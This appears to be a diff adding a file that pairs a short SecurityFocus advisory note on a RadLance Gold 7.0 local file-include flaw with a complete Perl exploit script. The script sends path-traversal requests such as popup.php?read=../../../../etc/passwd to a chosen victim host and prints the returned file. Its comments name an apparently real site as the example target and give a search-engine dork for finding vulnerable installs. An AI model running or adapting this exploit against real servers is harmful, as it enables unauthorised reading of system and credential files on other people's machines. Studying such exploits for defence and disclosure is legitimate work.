@@ -1,0 +1,72 @@
+source: http://www.securityfocus.com/bid/17975/info
+
+RadLance is prone to a local file-include vulnerability. This may allow unauthorized users to view files and to execute local scripts.
+
+RadLance Gold 7.0 is reported affected by this issue; other versions may also be vulnerable.
+
+#!/usr/bin/perl
+#Discovered and coded by Mr.CrackerZ ( Security Team )
+#Contact me ( bo_ali90@hotmail.com )
+#Usage: radlance.pl <victim> <local file to read>
+#Google: Powered by: RadLance Gold v7
+#Tested Under RadLance Gold v7 ( Local Inclusion Exploit )
+#Example:
+http://www.getabuilder.co.uk/popup.php?read=../../../../../../../../../etc/passwd
+#Perl example: radlance.pl www.getabuilder.co.uk
+../../../../../../../../../etc/passwd
+#################################################
+
+
+
+
+
+use IO::Socket;
+if(@ARGV < 2){
+print "
++*************************************************************************+
+
+Exploit Discovered and coded by Mr.CrackerZ ( Security Team )
+
+radlance.pl <victim> <local file to read>
+
+<victim> = www.example.com
+
+<local file to read> = ../../../../../../../../../etc/passwd
+
+
++*************************************************************************+
+";
+exit();
+}
+#Local variables
+$wbbserver = $ARGV[0];
+$wbbserver =~ s/(http:\/\/)//eg;
+$wbbhost = "http://".$wbbserver;
+$port = "80";
+$wbbtar = "/popup.php?read=";
+$wbbxp = $ARGV[1];
+$wbbreq = $wbbhost.$wbbtar.$wbbxp;
+#Writing data to socket
+print "\r\n";
+print "+ Trying to connect: $wbbserver\n";
+$wbb = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$wbbserver",
+PeerPort => "$port") || die "\n+ Connection failed...\n";
+print $wbb "GET $wbbreq\n";
+print $wbb "Host: $wbbserver\n";
+print $wbb "Accept: */*\n";
+print $wbb "Connection: close\n\n";
+print "+ Connected!...\n";
+print "\r\n";
+print
+"+**********************************************************************+\n";
+while($answer = <$wbb>) {
+
+print <$wbb>;
+printf "\r\n";
+
+}
+
+print
+"+**********************************************************************+\n\ncopy
+the code and save it as .html or .php depend the file u are trying
+to\naccess to , and if u saw the file cont so you got what u need :)\n";
